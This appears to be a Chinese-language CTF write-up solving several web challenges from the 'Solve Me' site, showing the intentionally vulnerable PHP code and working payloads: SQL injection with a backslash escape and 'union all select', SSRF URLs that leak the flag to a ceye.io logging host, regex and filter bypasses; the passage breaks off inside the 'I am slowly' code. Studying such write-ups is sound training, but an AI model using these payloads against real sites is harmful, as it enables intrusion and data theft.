<h2><span id="array2string">Array2String</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    $value = $_GET[&apos;value&apos;];</span><br><span class="line"></span><br><span class="line">    $username = $_GET[&apos;username&apos;];</span><br><span class="line">    $password = $_GET[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">    for ($i = 0; $i &lt; count($value); ++$i) &#123;</span><br><span class="line">        if ($_GET[&apos;username&apos;]) unset($username);</span><br><span class="line">        if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value);</span><br><span class="line">        else $username .= chr($value[$i]);</span><br><span class="line"></span><br><span class="line">        if ($username == &apos;15th_HackingCamp&apos; &amp;&amp; md5($password) == md5(file_get_contents(&apos;./secret.passwd&apos;))) &#123;</span><br><span class="line">            echo &apos;Hello &apos;.$username.&apos;!&apos;, &apos;&lt;br&gt;&apos;, PHP_EOL;</span><br><span class="line">            echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解：</p>
<ul>
<li>unset — 释放给定的变量</li>
<li>chr - 函数从指定的 ASCII 值返回字符。</li>
</ul>
<p>看以上代码，可以看出这里的<code>$username</code>是通过<code>$value</code>拼接出来的，这里我们就需要用value拼接出<code>15th_HackingCamp</code></p>
<p>这里还规定了ASCII值不能在32-127这个范围内。</p>
<p>在PHP中，chr有以下特性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note that if the number is higher than 256, it will return the number mod 256.</span><br><span class="line">For example :</span><br><span class="line">chr(321)=A because A=65(256)</span><br></pre></td></tr></table></figure>
<p>所以用以下脚本生成一个payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$username = &apos;15th_HackingCamp&apos;;</span><br><span class="line">	$arr = str_split($username);</span><br><span class="line">	</span><br><span class="line">	foreach($arr as $value)&#123;</span><br><span class="line">		$value = ord($value) + 256;</span><br><span class="line">		$payload .= &apos;value[]=&apos; . $value . &apos;&amp;&apos;;</span><br><span class="line">	&#125; </span><br><span class="line">	echo $payload .= &apos;password=simple_passw0rd&apos;;</span><br></pre></td></tr></table></figure>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure>
<h2><span id="give-me-a-link">Give me a link</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^https?\:\/\/&apos;.$_SERVER[&apos;HTTP_HOST&apos;].&apos;/i&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed URL&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if($parse[&apos;path&apos;] !== &apos;/plz_give_me&apos;)&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[&apos;scheme&apos;].&apos;://&apos;.$parse[&apos;host&apos;].&apos;/&apos;.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码中用了三个preg_match函数进行过滤</p>
<ul>
<li>第一个过滤了下划线</li>
<li>第二个限制<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>,并且抓包不允许修改HOST</li>
<li>第三个parse_url解析后路径需为/plz_give_me</li>
</ul>
<p>显然第三个和第一个是矛盾的。但是在官方手册上，parse_url有一个</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line">要解析的 URL。无效字符将使用 _ 来替换。</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$url = urldecode(&quot;https://uknowsec.cn/%11test%11&quot;);</span><br><span class="line">	var_dump(parse_url($url));</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">输出：</span><br><span class="line">array(3) &#123; [&quot;scheme&quot;]=&gt;  string(4) &quot;http&quot; [&quot;host&quot;]=&gt;  string(11) &quot;uknowsec.cn&quot; [&quot;path&quot;]=&gt;  string(7) &quot;/_test_&quot; &#125;</span><br></pre></td></tr></table></figure>
<p>这样我们就可以绕过第三个和第一个过滤了。</p>
<p>但是我们提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr/plz%11give%11me</span><br></pre></td></tr></table></figure>
<p>没有回显是得不到flag的，如何解决Host的问题在官方手册中还有这样一句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$url = &apos;http://username:password@hostname:9090/path?arg=value#anchor&apos;;</span><br></pre></td></tr></table></figure>
<p>所以Host的值我们可以构造</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givemealink.solveme.peng.kr@hostname</span><br></pre></td></tr></table></figure>
<p>我们可以用CEYE.IO来得到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@test.xxx.ceye.io/plz%1agive%1ame</span><br></pre></td></tr></table></figure>
<h2><span id="give-me-a-link">Give me a link</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;url&apos;]))&#123;</span><br><span class="line">        $url = $_GET[&apos;url&apos;];</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/_|\s|\0/&apos;, $url))&#123;</span><br><span class="line">            die(&apos;Not allowed character&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        if(!preg_match(&apos;/^https?$/i&apos;, $parse[&apos;scheme&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed scheme&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed host&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!preg_match(&apos;/\/plz_give_me$/&apos;, $parse[&apos;path&apos;]))&#123;</span><br><span class="line">            die(&apos;Not allowed path&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        if($socket === false)&#123;</span><br><span class="line">            die(&apos;Failed to create socket&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[&apos;host&apos;]);</span><br><span class="line">        $port = is_null($parse[&apos;port&apos;]) ? 80 : $parse[&apos;port&apos;];</span><br><span class="line"></span><br><span class="line">        if(socket_connect($socket, $host, $port) === false)&#123;</span><br><span class="line">            die(&apos;Failed to connect&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = &quot;HEAD /&quot;.$flag.&quot; HTTP/1.1\r\n&quot;.</span><br><span class="line">            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</span><br><span class="line">            &quot;Connection: Close\r\n&quot;.</span><br><span class="line">            &quot;\r\n\r\n&quot;;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, 1024);var_dump($recv);</span><br><span class="line">        if(!preg_match(&apos;/^HTTP\/1.1 200 OK\r\n/&apos;, $recv))&#123;</span><br><span class="line">            die(&apos;Not allowed response&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        echo &apos;Okay, I sent the flag.&apos;, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这个题目和前面一个题目类似，但是这里对host有了新的要求:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&apos;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&apos;, $parse[&apos;host&apos;]))&#123;</span><br><span class="line">    die(&apos;Not allowed host&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>正则要求以localhost和127开头，可以用ip2long来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Note:</span><br><span class="line"></span><br><span class="line">因为PHP的 integer 类型是有符号，并且有许多的IP地址讲导致在32位系统的情况下为负数， 你需要使用 &quot;%u&quot; 进行转换通过 sprintf() 或 printf() 得到的字符串来表示无符号的IP地址。</span><br></pre></td></tr></table></figure>
<p>在手册中有如上Note，这里如果直接代入负数是不能正常访问的，所以我们要把他转换为无符号的ip地址。</p>
<p>构造脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$ip =&apos;182.254.0.0&apos;;</span><br><span class="line">	echo ip2long($ip),&apos;&lt;br&gt;&apos;;		//-1224867840</span><br><span class="line">	printf(&quot;%u\n&quot;, ip2long($ip));	//3070099456</span><br></pre></td></tr></table></figure>
<p>这里我们代入3070099456发送payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink2.solveme.peng.kr/?url=http://3070099456/plz%01give%01me</span><br></pre></td></tr></table></figure></p>
<p>这里就可以在web服务器日志中查看flag。</p>
<h2><span id="replace-filter">Replace filter</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;say&apos;]) &amp;&amp; strlen($_GET[&apos;say&apos;]) &lt; 20)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(&apos;/^(.*)flag(.*)$/&apos;, &apos;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&apos;, $_GET[&apos;say&apos;]);</span><br><span class="line"></span><br><span class="line">        if(preg_match(&apos;/give_me_the_flag/&apos;, $say))&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;What the f**k?&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/^(.*)flag(.*)$/</span><br></pre></td></tr></table></figure>
<p>以上正则是存在一个缺陷的，<code>^ $</code>界定了必须在同一行，否则匹配不到,所以我们可以用换行符进行绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://replacefilter.solveme.peng.kr?say=%0agive_me_the_flag</span><br></pre></td></tr></table></figure>
<h2><span id="hell-js">Hell JS</span></h2><p>打开题目，查看源码发现是jsfuck。</p>
<p>一般这种题目是可以直接控制台运行的。但是这里是不行的，</p>
<p>先了解下jsfuck的编码格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval        =&gt;  [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )()</span><br><span class="line"></span><br><span class="line">比如：</span><br><span class="line">alert(1) 	=&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;alert(1)&quot;)()</span><br></pre></td></tr></table></figure>
<p>从这里我们可以看出我们可以根据括号匹配提取出<code>alert(1)</code>的jsfuck代码，而这串代码放到控制台是可以直接运行看到加密之前的结果的。</p>
<p>如下图：</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/jsfuck.png" alt=""></p>
<p>用同样的方法，我们去提取这一串jsfuck代码。这里可以用sublime text来进行括号的匹配</p>
<p><code>ctrl+shift+空格</code> 快捷键匹配</p>
<p>经过几次匹配就能得到jsfuck代码</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/jsfuck1.png" alt=""></p>
<h2><span id="anti-sqli">Anti SQLi</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;Anti SQLi&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $id = $_GET[&apos;id&apos;];</span><br><span class="line">    $pw = $_GET[&apos;pw&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($id, $pw))&#123;</span><br><span class="line">        preg_match(</span><br><span class="line">            &apos;/\.|\`|&quot;|\&apos;|\\|\xA0|\x0B|0x0C|\t|\r|\n|\0|&apos;.</span><br><span class="line">            &apos;=|&lt;|&gt;|\(|\)|@@|\|\||&amp;&amp;|#|\/\*.*\*\/|--[\s\xA0]|&apos;.</span><br><span class="line">            &apos;0x[0-9a-f]+|0b[01]+|x\&apos;[0-9a-f]+\&apos;|b\&apos;[01]+\&apos;|&apos;.</span><br><span class="line">            &apos;[\s\xA0\&apos;&quot;]+(as|or|and|r*like|regexp)[\s\xA0\&apos;&quot;]+|&apos;.</span><br><span class="line">            &apos;union[\s\xA0]+select|[\s\xA0](where|having)|&apos;.</span><br><span class="line">            &apos;[\s\xA0](group|order)[\s\xA0]+by|limit[\s\xA0]+\d|&apos;.</span><br><span class="line">            &apos;information_schema|procedure\s+analyse\s*/is&apos;,</span><br><span class="line">            $id.&apos;,&apos;.$pw</span><br><span class="line">        ) and die(&apos;Hack detected&apos;);</span><br><span class="line"></span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query(</span><br><span class="line">                $con, </span><br><span class="line">                &quot;SELECT * FROM `antisqli` WHERE `id`=&apos;&#123;$id&#125;&apos; AND `pw`=md5(&apos;&#123;$pw&#125;&apos;);&quot;</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        if(isset($result))&#123;</span><br><span class="line">            if($result[&apos;no&apos;] === &apos;31337&apos;)&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                echo &apos;Hello, &apos;, $result[&apos;id&apos;];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Login failed&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>在正则里的第一行<code>|\\|</code>没有匹配到<code>\</code>,所以这个相当于完全没用, 匹配到<code>\</code>，需要<code>四个\</code>。因为<code>\</code>没有被过滤也给了我们逃逸单引号的条件, 只要<code>$_GET[&#39;id&#39;] = 1\</code>就可以逃逸出第一个单引号</p>
<p>在正则中的第二行<code>|#|--[\s\xA0]|</code> 过了用来注释的<code>#</code>和<code>--</code>这里的可以用<code>--</code>加一个不可见字符替代，例如:<code>%01 %11 %02</code>等</p>
<blockquote>
<p>直接尝试?id=1\&amp;pw=–%01 仍然显示login failed, 而这在本地测试中是可行的, 原因是本地测试中 id 被设置为INT, 而在题目中猜测 id  被设置为了VARCHAR, 于是考虑重新构造一个 union 查询</p>
</blockquote>
<p>正则中过滤了 union[\s\xA0]+select 但是可以直接用 union all select 来绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=union all select 31337,31337,31337 from antisqli --%11</span><br></pre></td></tr></table></figure>
<h2><span id="name-check">Name check</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;name&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        $name = $_GET[&apos;name&apos;];</span><br><span class="line">        if(preg_match(&quot;/admin|--|;|\(\)|\/\*|\\0/i&quot;, $name))&#123;</span><br><span class="line">            echo &apos;Not allowed input&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sql = new SQLite3(&apos;name_check.db&apos;, SQLITE3_OPEN_READWRITE);</span><br><span class="line">        $res = $sql-&gt;query(&quot;</span><br><span class="line">            SELECT </span><br><span class="line">            MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, </span><br><span class="line">            INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, </span><br><span class="line">            MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, </span><br><span class="line">            SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;</span><br><span class="line">        ;&quot;);</span><br><span class="line">        if($res === false)&#123;</span><br><span class="line">            echo &apos;Database error&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $row = $res-&gt;fetchArray(SQLITE3_NUM);</span><br><span class="line">        if(</span><br><span class="line">            $row[0] + $row[1] + $row[2] + $row[3] !== 4 ||</span><br><span class="line">            array_sum($row) !== 4 </span><br><span class="line">        )&#123;</span><br><span class="line">            echo &apos;Auth failed&apos;;</span><br><span class="line">            goto quit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag;</span><br><span class="line"></span><br><span class="line">    quit:</span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>从上面代码中可以看出满足 <code>row[0] + $row[1] + $row[2] + $row[3] = 4</code> 就能输出flag。这个表达式的意思就是<code>sql</code>语句四个都为true。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MAX(&apos;0&apos;,&apos;1&apos;,&apos;&#123;$name&#125;&apos;) LIKE &apos;a%&apos;, 			\\name的首字母为a</span><br><span class="line">INSTR(&apos;&#123;$name&#125;&apos;,&apos;d&apos;)&gt;0, 					\\name中有d</span><br><span class="line">MIN(&apos;&#123;$name&#125;&apos;,&apos;b&apos;,&apos;c&apos;) LIKE &apos;__m__&apos;, 		\\name中间的字母为m</span><br><span class="line">SUBSTR(&apos;&#123;$name&#125;&apos;,-2)=&apos;in&apos;					\\name以in结尾</span><br></pre></td></tr></table></figure>
<p>从上面的代码可以看出这里需要传入的<code>$name</code>的值就是<code>admin</code>，但是上面有正则过滤了<code>admin</code></p>
<p>sqlite的特性考虑查阅手册发现:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite中，连接字符串不是使用+，而是使用||</span><br></pre></td></tr></table></figure></p>
<p>且<code>||</code>没有被过滤 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://namecheck.solveme.peng.kr/?name=adm&apos;||&apos;in</span><br></pre></td></tr></table></figure>
<h2><span id="i-am-slowly">I am slowly</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    // It&apos;s &apos;I am slowly&apos; problem of &apos;Solve Me&apos;.</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;; </span><br><span class="line"></span><br><span class="line">    $table = &apos;iamslowly_&apos;.ip2long($_SERVER[&apos;REMOTE_ADDR&apos;]);</span><br><span class="line">    $answer = $_GET[&apos;answer&apos;];</span><br><span class="line"></span><br><span class="line">    if(isset($answer))&#123;</span><br><span class="line">        $con = mysqli_connect($sql_host, $sql_username, $sql_password, $sql_dbname)</span><br><span class="line">            or die(&apos;SQL server down&apos;);</span><br><span class="line"></span><br><span class="line">        $result = mysqli_fetch_array(</span><br><span class="line">            mysqli_query($con, &quot;SELECT `count` FROM `&#123;$table&#125;`;&quot;)</span><br><span class="line">        );</span><br><span class="line">        if(!isset($result))&#123;</span><br><span class="line">            mysqli_query($con, &quot;CREATE TABLE IF NOT EXISTS `&#123;$table&#125;` (`answer` char(32) NOT NULL, `count` int(4) NOT NULL);&quot;);</span><br><span class="line">            $new_answer = 